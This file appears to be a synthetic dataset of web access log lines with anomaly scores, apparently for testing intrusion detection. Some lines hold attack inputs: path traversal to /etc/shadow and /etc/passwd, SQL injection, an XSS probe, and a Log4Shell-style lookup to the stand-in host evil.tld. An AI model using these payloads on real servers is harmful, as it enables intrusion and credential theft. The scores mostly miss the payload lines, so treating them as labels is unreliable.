score_content,score_session,score_fused,score_fused_norm,line
70.55095672607422,,70.55095672607422,70.55095672607422,100.143.229.198 - - [10/Jan/2025:12:02:46 +0100] "HEAD /search?q=phone HTTP/1.1" 200 13903 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.31779479980469,,96.31779479980469,96.31779479980469,205.195.229.38 - - [10/Jan/2025:12:02:47 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 13451 "https://news.ycombinator.com/" "curl/7.85.0"
50.46861267089844,,50.46861267089844,50.46861267089844,152.202.187.47 - - [10/Jan/2025:12:02:49 +0100] "DELETE /search?q=monitor HTTP/1.1" 200 5730 "https://example.com/" "curl/7.85.0"
11025.828125,,11025.828125,11025.828125,226.163.62.105 - - [10/Jan/2025:12:02:49 +0100] "POST /admin HTTP/1.1" 500 656 "https://example.com/" "dirb/2.22"
30225.03125,,30225.03125,30225.03125,97.25.244.164 - - [10/Jan/2025:12:02:50 +0100] "TRACE /api/products HTTP/1.1" 403 553 "-" "sqlmap/1.7.2#stable"
73.4332046508789,,73.4332046508789,73.4332046508789,43.87.115.72 - - [10/Jan/2025:12:02:51 +0100] "OPTIONS /logout HTTP/1.1" 200 5989 "-" "python-requests/2.31.0"
27.62896728515625,,27.62896728515625,27.62896728515625,59.182.18.211 - - [10/Jan/2025:12:02:51 +0100] "POST /search?q=router HTTP/1.1" 200 19641 "-" "nikto/2.5.0"
30168.76171875,,30168.76171875,30168.76171875,241.135.57.238 - - [10/Jan/2025:12:02:51 +0100] "HEAD /contact HTTP/1.1" 403 693 "-" "Wget/1.21.2 (linux-gnu)"
70.56983184814453,,70.56983184814453,70.56983184814453,238.17.119.242 - - [10/Jan/2025:12:02:53 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 6873 "https://www.google.com/" "python-requests/2.31.0"
24.754274368286133,,24.754274368286133,24.754274368286133,192.94.207.232 - - [10/Jan/2025:12:02:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 2074 "-" "curl/7.85.0"
96.28697967529297,,96.28697967529297,96.28697967529297,14.146.252.153 - - [10/Jan/2025:12:02:56 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 4664 "https://news.ycombinator.com/" "curl/7.85.0"
127.58898162841797,,127.58898162841797,127.58898162841797,208.54.4.227 - - [10/Jan/2025:12:02:57 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 3667 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.22319206595420837,,0.22319206595420837,0.22319206595420837,51.23.224.225 - - [10/Jan/2025:12:02:58 +0100] "GET /assets/app.css HTTP/1.1" 200 17788 "https://example.com/" "nikto/2.5.0"
127.76237487792969,,127.76237487792969,127.76237487792969,65.179.78.69 - - [10/Jan/2025:12:02:58 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 17280 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.20976257324219,,96.20976257324219,96.20976257324219,43.10.152.85 - - [10/Jan/2025:12:02:59 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://twitter.com/" "curl/7.85.0"
3.043247938156128,,3.043247938156128,3.043247938156128,13.201.207.73 - - [10/Jan/2025:12:03:01 +0100] "GET /assets/app.js HTTP/1.1" 304 7228 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.33280944824219,,96.33280944824219,96.33280944824219,148.148.196.76 - - [10/Jan/2025:12:03:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 204 19775 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.50932693481445,,50.50932693481445,50.50932693481445,243.102.26.137 - - [10/Jan/2025:12:03:01 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 12107 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.684778213500977,,27.684778213500977,27.684778213500977,211.98.106.88 - - [10/Jan/2025:12:03:01 +0100] "POST /api/product?id=123 HTTP/1.1" 200 16670 "-" "python-requests/2.31.0"
36.259830474853516,,36.259830474853516,36.259830474853516,12.6.249.27 - - [10/Jan/2025:12:03:04 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 9976 "https://news.ycombinator.com/" "python-requests/2.31.0"
103.21028137207031,,103.21028137207031,103.21028137207031,175.221.45.91 - - [10/Jan/2025:12:03:05 +0100] "TRACE /wp-login.php HTTP/1.1" 200 13126 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.3079710006713867,,0.3079710006713867,0.3079710006713867,1.144.230.162 - - [10/Jan/2025:12:03:05 +0100] "GET /index.html HTTP/1.1" 200 13228 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.191311836242676,,2.191311836242676,2.191311836242676,222.9.92.211 - - [10/Jan/2025:12:03:05 +0100] "GET / HTTP/1.1" 200 19292 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
50.517662048339844,,50.517662048339844,50.517662048339844,167.109.190.77 - - [10/Jan/2025:12:03:08 +0100] "DELETE /search?q=phone HTTP/1.1" 200 8626 "https://news.ycombinator.com/" "nikto/2.5.0"
127.71862030029297,,127.71862030029297,127.71862030029297,6.107.194.97 - - [10/Jan/2025:12:03:08 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 4802 "-" "curl/7.85.0"
13.324752807617188,,13.324752807617188,13.324752807617188,26.150.198.67 - - [10/Jan/2025:12:03:08 +0100] "PUT /api/products HTTP/1.1" 200 3032 "https://example.com/" "dirb/2.22"
76.34046173095703,,76.34046173095703,76.34046173095703,16.48.21.13 - - [10/Jan/2025:12:03:09 +0100] "OPTIONS /login HTTP/1.1" 304 18202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.060208797454834,,3.060208797454834,3.060208797454834,77.220.83.242 - - [10/Jan/2025:12:03:09 +0100] "GET /assets/app.css HTTP/1.1" 304 19962 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
127.638916015625,,127.638916015625,127.638916015625,26.217.76.7 - - [10/Jan/2025:12:03:10 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 19135 "-" "nikto/2.5.0"
1.9334121942520142,,1.9334121942520142,1.9334121942520142,164.150.137.60 - - [10/Jan/2025:12:03:13 +0100] "GET /logout HTTP/1.1" 200 12097 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
70.49767303466797,,70.49767303466797,70.49767303466797,114.118.102.151 - - [10/Jan/2025:12:03:16 +0100] "HEAD /search?q=router HTTP/1.1" 200 4273 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.798753261566162,,4.798753261566162,4.798753261566162,232.245.31.125 - - [10/Jan/2025:12:03:16 +0100] "POST /contact HTTP/1.1" 200 15329 "https://example.com/" "curl/7.85.0"
30.371257781982422,,30.371257781982422,30.371257781982422,210.132.62.129 - - [10/Jan/2025:12:03:16 +0100] "POST /search?q=laptop HTTP/1.1" 302 2034 "https://news.ycombinator.com/" "nikto/2.5.0"
96.2771987915039,,96.2771987915039,96.2771987915039,59.128.215.78 - - [10/Jan/2025:12:03:17 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 237 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.85540008544922,,104.85540008544922,104.85540008544922,142.231.73.169 - - [10/Jan/2025:12:03:20 +0100] "TRACE /contact HTTP/1.1" 200 13403 "-" "nikto/2.5.0"
27.77528190612793,,27.77528190612793,27.77528190612793,132.247.156.122 - - [10/Jan/2025:12:03:23 +0100] "DELETE /about HTTP/1.1" 200 18284 "https://www.google.com/" "nikto/2.5.0"
24.840822219848633,,24.840822219848633,24.840822219848633,19.54.209.111 - - [10/Jan/2025:12:03:23 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14193 "-" "curl/7.85.0"
13.456218719482422,,13.456218719482422,13.456218719482422,207.174.123.242 - - [10/Jan/2025:12:03:24 +0100] "PUT /about HTTP/1.1" 200 12709 "https://www.google.com/" "python-requests/2.31.0"
70.53362274169922,,70.53362274169922,70.53362274169922,240.12.183.108 - - [10/Jan/2025:12:03:27 +0100] "HEAD /search?q=laptop HTTP/1.1" 200 14820 "https://www.google.com/" "python-requests/2.31.0"
24.78077507019043,,24.78077507019043,24.78077507019043,25.160.19.9 - - [10/Jan/2025:12:03:30 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 11142 "https://news.ycombinator.com/" "dirb/2.22"
4.694054126739502,,4.694054126739502,4.694054126739502,69.33.76.168 - - [10/Jan/2025:12:03:31 +0100] "GET /logout HTTP/1.1" 302 3256 "https://www.google.com/" "nikto/2.5.0"
47.79017639160156,,47.79017639160156,47.79017639160156,31.58.112.41 - - [10/Jan/2025:12:03:34 +0100] "HEAD /login HTTP/1.1" 200 19778 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.29640197753906,,73.29640197753906,73.29640197753906,2.203.54.114 - - [10/Jan/2025:12:03:37 +0100] "HEAD /search?q=router HTTP/1.1" 301 6695 "https://news.ycombinator.com/" "nikto/2.5.0"
0.22500410676002502,,0.22500410676002502,0.22500410676002502,128.243.179.216 - - [10/Jan/2025:12:03:37 +0100] "GET /assets/app.css HTTP/1.1" 200 18476 "https://www.google.com/" "python-requests/2.31.0"
104.72844696044922,,104.72844696044922,104.72844696044922,139.60.51.242 - - [10/Jan/2025:12:03:38 +0100] "TRACE /phpmyadmin HTTP/1.1" 201 3229 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
11.63503360748291,,11.63503360748291,11.63503360748291,80.47.139.39 - - [10/Jan/2025:12:03:40 +0100] "PUT /../../etc/passwd HTTP/1.1" 200 6803 "-" "curl/7.85.0"
70.54651641845703,,70.54651641845703,70.54651641845703,178.147.180.31 - - [10/Jan/2025:12:03:43 +0100] "HEAD /search?q=camera HTTP/1.1" 200 19542 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.760408401489258,,27.760408401489258,27.760408401489258,98.231.154.132 - - [10/Jan/2025:12:03:45 +0100] "DELETE /login HTTP/1.1" 200 13059 "-" "Wget/1.21.2 (linux-gnu)"
11.956188201904297,,11.956188201904297,11.956188201904297,243.95.144.209 - - [10/Jan/2025:12:03:47 +0100] "PUT /.env HTTP/1.1" 200 3146 "https://twitter.com/" "dirb/2.22"
4.64855432510376,,4.64855432510376,4.64855432510376,157.61.254.225 - - [10/Jan/2025:12:03:50 +0100] "GET /api/products HTTP/1.1" 302 8293 "-" "python-requests/2.31.0"
24.823705673217773,,24.823705673217773,24.823705673217773,32.184.149.184 - - [10/Jan/2025:12:03:51 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 8907 "-" "nikto/2.5.0"
4.845283031463623,,4.845283031463623,4.845283031463623,13.214.209.231 - - [10/Jan/2025:12:03:52 +0100] "POST /admin HTTP/1.1" 200 8308 "https://twitter.com/" "curl/7.85.0"
30127.830078125,,30127.830078125,30127.830078125,15.105.110.174 - - [10/Jan/2025:12:03:53 +0100] "POST /api/products HTTP/1.1" 429 975 "https://news.ycombinator.com/" "python-requests/2.31.0"
30194.091796875,,30194.091796875,30194.091796875,227.177.184.54 - - [10/Jan/2025:12:03:55 +0100] "OPTIONS /about HTTP/1.1" 401 855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.602319717407227,,27.602319717407227,27.602319717407227,39.94.196.178 - - [10/Jan/2025:12:03:57 +0100] "POST /search?q=laptop HTTP/1.1" 200 10478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.520227432250977,,27.520227432250977,27.520227432250977,237.176.173.60 - - [10/Jan/2025:12:03:58 +0100] "POST /search?q=headphones HTTP/1.1" 200 5345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.18642625212669373,,0.18642625212669373,0.18642625212669373,237.233.133.76 - - [10/Jan/2025:12:03:59 +0100] "GET /assets/app.css HTTP/1.1" 200 6256 "-" "python-requests/2.31.0"
27.656660079956055,,27.656660079956055,27.656660079956055,106.21.251.157 - - [10/Jan/2025:12:04:00 +0100] "POST /api/product?id=123 HTTP/1.1" 201 8328 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
70.58921813964844,,70.58921813964844,70.58921813964844,9.236.94.178 - - [10/Jan/2025:12:04:00 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 12471 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.016916513442993,,3.016916513442993,3.016916513442993,75.120.21.238 - - [10/Jan/2025:12:04:01 +0100] "GET /assets/app.css HTTP/1.1" 302 18891 "https://www.google.com/" "dirb/2.22"
4.761264324188232,,4.761264324188232,4.761264324188232,9.254.160.165 - - [10/Jan/2025:12:04:04 +0100] "GET /login HTTP/1.1" 301 19686 "https://www.google.com/" "curl/7.85.0"
50.58774185180664,,50.58774185180664,50.58774185180664,88.47.11.7 - - [10/Jan/2025:12:04:04 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 17453 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
16.12256622314453,,16.12256622314453,16.12256622314453,184.179.229.75 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/products HTTP/1.1" 302 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
36.34198760986328,,36.34198760986328,36.34198760986328,166.175.137.188 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 19821 "-" "sqlmap/1.7.2#stable"
103.1420669555664,,103.1420669555664,103.1420669555664,139.97.237.230 - - [10/Jan/2025:12:04:08 +0100] "TRACE /../../etc/passwd HTTP/1.1" 200 18574 "https://www.google.com/" "sqlmap/1.7.2#stable"
27.677919387817383,,27.677919387817383,27.677919387817383,20.66.107.129 - - [10/Jan/2025:12:04:09 +0100] "DELETE /api/products HTTP/1.1" 200 18644 "https://twitter.com/" "curl/7.85.0"
45.90837478637695,,45.90837478637695,45.90837478637695,138.121.252.30 - - [10/Jan/2025:12:04:10 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17063 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.596086502075195,,27.596086502075195,27.596086502075195,49.158.99.16 - - [10/Jan/2025:12:04:13 +0100] "DELETE /dashboard HTTP/1.1" 200 3467 "-" "python-requests/2.31.0"
1.9067703485488892,,1.9067703485488892,1.9067703485488892,70.253.241.176 - - [10/Jan/2025:12:04:15 +0100] "GET /logout HTTP/1.1" 200 4491 "https://example.com/" "sqlmap/1.7.2#stable"
11.621478080749512,,11.621478080749512,11.621478080749512,68.182.53.119 - - [10/Jan/2025:12:04:18 +0100] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2169 "https://www.google.com/" "python-requests/2.31.0"
127.63648223876953,,127.63648223876953,127.63648223876953,131.231.214.243 - - [10/Jan/2025:12:04:19 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 18206 "https://example.com/" "python-requests/2.31.0"
2.1853160858154297,,2.1853160858154297,2.1853160858154297,43.57.35.166 - - [10/Jan/2025:12:04:22 +0100] "GET / HTTP/1.1" 200 17016 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
47.693824768066406,,47.693824768066406,47.693824768066406,68.223.154.86 - - [10/Jan/2025:12:04:23 +0100] "HEAD /contact HTTP/1.1" 200 10360 "https://example.com/" "dirb/2.22"
130.55677795410156,,130.55677795410156,130.55677795410156,73.159.65.114 - - [10/Jan/2025:12:04:23 +0100] "TRACE /search?q=ssd HTTP/1.1" 301 19987 "https://twitter.com/" "python-requests/2.31.0"
27.565523147583008,,27.565523147583008,27.565523147583008,161.212.223.94 - - [10/Jan/2025:12:04:25 +0100] "POST /search?q=headphones HTTP/1.1" 200 19686 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.2952353358268738,,0.2952353358268738,0.2952353358268738,228.243.180.254 - - [10/Jan/2025:12:04:27 +0100] "GET /index.html HTTP/1.1" 200 9320 "https://news.ycombinator.com/" "dirb/2.22"
30122.357421875,,30122.357421875,30122.357421875,147.137.114.95 - - [10/Jan/2025:12:04:29 +0100] "GET /assets/app.js HTTP/1.1" 401 8 "https://www.google.com/" "curl/7.85.0"
70.53433227539062,,70.53433227539062,70.53433227539062,50.188.57.13 - - [10/Jan/2025:12:04:31 +0100] "HEAD /search?q=phone HTTP/1.1" 200 8824 "https://news.ycombinator.com/" "python-requests/2.31.0"
30.462299346923828,,30.462299346923828,30.462299346923828,4.227.200.145 - - [10/Jan/2025:12:04:34 +0100] "POST /search?q=ssd HTTP/1.1" 302 10301 "https://twitter.com/" "nikto/2.5.0"
24.67823600769043,,24.67823600769043,24.67823600769043,215.211.202.173 - - [10/Jan/2025:12:04:34 +0100] "GET /search?q=monitor HTTP/1.1" 200 5332 "https://twitter.com/" "python-requests/2.31.0"
127.78201293945312,,127.78201293945312,127.78201293945312,61.116.77.49 - - [10/Jan/2025:12:04:36 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7004 "https://news.ycombinator.com/" "nikto/2.5.0"
0.23128695785999298,,0.23128695785999298,0.23128695785999298,54.224.145.176 - - [10/Jan/2025:12:04:39 +0100] "GET /assets/app.js HTTP/1.1" 204 14818 "-" "curl/7.85.0"
0.2271348088979721,,0.2271348088979721,0.2271348088979721,247.139.11.226 - - [10/Jan/2025:12:04:40 +0100] "GET /assets/app.js HTTP/1.1" 200 11640 "https://twitter.com/" "dirb/2.22"
47.634742736816406,,47.634742736816406,47.634742736816406,229.170.178.17 - - [10/Jan/2025:12:04:40 +0100] "HEAD /dashboard HTTP/1.1" 200 11301 "https://www.google.com/" "nikto/2.5.0"
1.8386077880859375,,1.8386077880859375,1.8386077880859375,172.117.173.129 - - [10/Jan/2025:12:04:40 +0100] "GET /api/products HTTP/1.1" 200 2795 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
36.34725570678711,,36.34725570678711,36.34725570678711,107.114.101.102 - - [10/Jan/2025:12:04:43 +0100] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 2176 "https://example.com/" "python-requests/2.31.0"
11148.98046875,,11148.98046875,11148.98046875,78.231.98.112 - - [10/Jan/2025:12:04:46 +0100] "TRACE /search?q=phone HTTP/1.1" 500 735 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.471471786499023,,13.471471786499023,13.471471786499023,52.52.170.78 - - [10/Jan/2025:12:04:46 +0100] "PUT /about HTTP/1.1" 200 18021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.003572940826416,,5.003572940826416,5.003572940826416,1.48.175.184 - - [10/Jan/2025:12:04:48 +0100] "GET / HTTP/1.1" 304 12495 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
39.12734603881836,,39.12734603881836,39.12734603881836,26.1.93.29 - - [10/Jan/2025:12:04:50 +0100] "PUT /search?q=ssd HTTP/1.1" 304 18345 "https://example.com/" "nikto/2.5.0"
0.23046666383743286,,0.23046666383743286,0.23046666383743286,64.15.220.69 - - [10/Jan/2025:12:04:51 +0100] "GET /assets/app.js HTTP/1.1" 200 12693 "-" "dirb/2.22"
24.703025817871094,,24.703025817871094,24.703025817871094,172.70.253.117 - - [10/Jan/2025:12:04:53 +0100] "GET /search?q=laptop HTTP/1.1" 200 7041 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.629169464111328,,27.629169464111328,27.629169464111328,140.235.149.35 - - [10/Jan/2025:12:04:53 +0100] "DELETE /dashboard HTTP/1.1" 200 13080 "https://news.ycombinator.com/" "dirb/2.22"
36.239559173583984,,36.239559173583984,36.239559173583984,81.51.111.55 - - [10/Jan/2025:12:04:53 +0100] "PUT /search?q=phone HTTP/1.1" 200 17426 "-" "python-requests/2.31.0"
53.20646667480469,,53.20646667480469,53.20646667480469,240.161.17.55 - - [10/Jan/2025:12:04:55 +0100] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 11095 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30172.0234375,,30172.0234375,30172.0234375,240.144.139.254 - - [10/Jan/2025:12:04:58 +0100] "DELETE /search?q=camera HTTP/1.1" 401 353 "https://example.com/" "python-requests/2.31.0"
30123.6171875,,30123.6171875,30123.6171875,240.200.192.126 - - [10/Jan/2025:12:05:01 +0100] "GET /about HTTP/1.1" 400 762 "https://twitter.com/" "dirb/2.22"
0.30049654841423035,,0.30049654841423035,0.30049654841423035,208.72.111.241 - - [10/Jan/2025:12:05:03 +0100] "GET /index.html HTTP/1.1" 200 10875 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.21400755643844604,,0.21400755643844604,0.21400755643844604,250.44.25.197 - - [10/Jan/2025:12:05:06 +0100] "GET /assets/app.css HTTP/1.1" 200 14500 "https://example.com/" "python-requests/2.31.0"
73.37487030029297,,73.37487030029297,73.37487030029297,222.196.83.75 - - [10/Jan/2025:12:05:07 +0100] "HEAD /api/product?id=123 HTTP/1.1" 302 5948 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.7171859741211,,127.7171859741211,127.7171859741211,118.129.75.186 - - [10/Jan/2025:12:05:10 +0100] "TRACE /search?q=phone HTTP/1.1" 201 17849 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2089926302433014,,0.2089926302433014,0.2089926302433014,228.75.88.124 - - [10/Jan/2025:12:05:10 +0100] "GET /assets/app.css HTTP/1.1" 200 417 "https://news.ycombinator.com/" "curl/7.85.0"
0.2118517905473709,,0.2118517905473709,0.2118517905473709,77.70.253.154 - - [10/Jan/2025:12:05:11 +0100] "GET /assets/app.css HTTP/1.1" 201 14350 "https://twitter.com/" "python-requests/2.31.0"
30.4699764251709,,30.4699764251709,30.4699764251709,126.139.154.86 - - [10/Jan/2025:12:05:11 +0100] "POST /api/product?id=123 HTTP/1.1" 302 13335 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.8717764616012573,,1.8717764616012573,1.8717764616012573,56.70.45.68 - - [10/Jan/2025:12:05:13 +0100] "GET /api/products HTTP/1.1" 200 12680 "https://www.google.com/" "python-requests/2.31.0"
46.06222915649414,,46.06222915649414,46.06222915649414,239.140.102.87 - - [10/Jan/2025:12:05:16 +0100] "HEAD /.git/config HTTP/1.1" 200 7440 "https://example.com/" "curl/7.85.0"
27.664892196655273,,27.664892196655273,27.664892196655273,206.28.202.105 - - [10/Jan/2025:12:05:16 +0100] "DELETE /profile HTTP/1.1" 200 5410 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.79804992675781,,104.79804992675781,104.79804992675781,129.167.154.200 - - [10/Jan/2025:12:05:18 +0100] "TRACE /api/products HTTP/1.1" 200 5261 "-" "curl/7.85.0"
24.99256706237793,,24.99256706237793,24.99256706237793,216.46.172.251 - - [10/Jan/2025:12:05:21 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 10282 "https://example.com/" "curl/7.85.0"
47.66763687133789,,47.66763687133789,47.66763687133789,148.173.230.179 - - [10/Jan/2025:12:05:21 +0100] "HEAD /contact HTTP/1.1" 200 2179 "-" "sqlmap/1.7.2#stable"
1.894432783126831,,1.894432783126831,1.894432783126831,89.4.217.110 - - [10/Jan/2025:12:05:22 +0100] "GET /profile HTTP/1.1" 200 10473 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.759072303771973,,4.759072303771973,4.759072303771973,235.223.126.156 - - [10/Jan/2025:12:05:25 +0100] "POST /contact HTTP/1.1" 204 1040 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.61195373535156,,71.61195373535156,71.61195373535156,233.54.58.232 - - [10/Jan/2025:12:05:26 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 423 "-" "curl/7.85.0"
27.665306091308594,,27.665306091308594,27.665306091308594,166.230.129.98 - - [10/Jan/2025:12:05:27 +0100] "DELETE /api/products HTTP/1.1" 200 14114 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11025.85546875,,11025.85546875,11025.85546875,75.50.96.203 - - [10/Jan/2025:12:05:30 +0100] "POST /api/products HTTP/1.1" 502 614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.717994689941406,,24.717994689941406,24.717994689941406,46.35.178.117 - - [10/Jan/2025:12:05:31 +0100] "GET /search?q=monitor HTTP/1.1" 200 17601 "https://twitter.com/" "dirb/2.22"
96.2216796875,,96.2216796875,96.2216796875,59.84.85.44 - - [10/Jan/2025:12:05:32 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 1341 "-" "Wget/1.21.2 (linux-gnu)"
36.19129943847656,,36.19129943847656,36.19129943847656,229.75.227.215 - - [10/Jan/2025:12:05:34 +0100] "PUT /search?q=laptop HTTP/1.1" 200 8360 "https://www.google.com/" "dirb/2.22"
76.18441772460938,,76.18441772460938,76.18441772460938,228.224.189.237 - - [10/Jan/2025:12:05:36 +0100] "OPTIONS /phpmyadmin HTTP/1.1" 304 19440 "-" "curl/7.85.0"
1.8425465822219849,,1.8425465822219849,1.8425465822219849,167.130.124.94 - - [10/Jan/2025:12:05:39 +0100] "GET /api/products HTTP/1.1" 200 4267 "-" "curl/7.85.0"
24.786651611328125,,24.786651611328125,24.786651611328125,67.90.180.169 - - [10/Jan/2025:12:05:42 +0100] "GET /search?q=ssd HTTP/1.1" 204 14133 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.784926414489746,,4.784926414489746,4.784926414489746,225.249.171.128 - - [10/Jan/2025:12:05:45 +0100] "POST /contact HTTP/1.1" 200 10837 "https://example.com/" "sqlmap/1.7.2#stable"
104.84624481201172,,104.84624481201172,104.84624481201172,126.222.182.75 - - [10/Jan/2025:12:05:48 +0100] "TRACE /contact HTTP/1.1" 200 10536 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
96.1991958618164,,96.1991958618164,96.1991958618164,213.163.122.141 - - [10/Jan/2025:12:05:50 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 15813 "-" "curl/7.85.0"
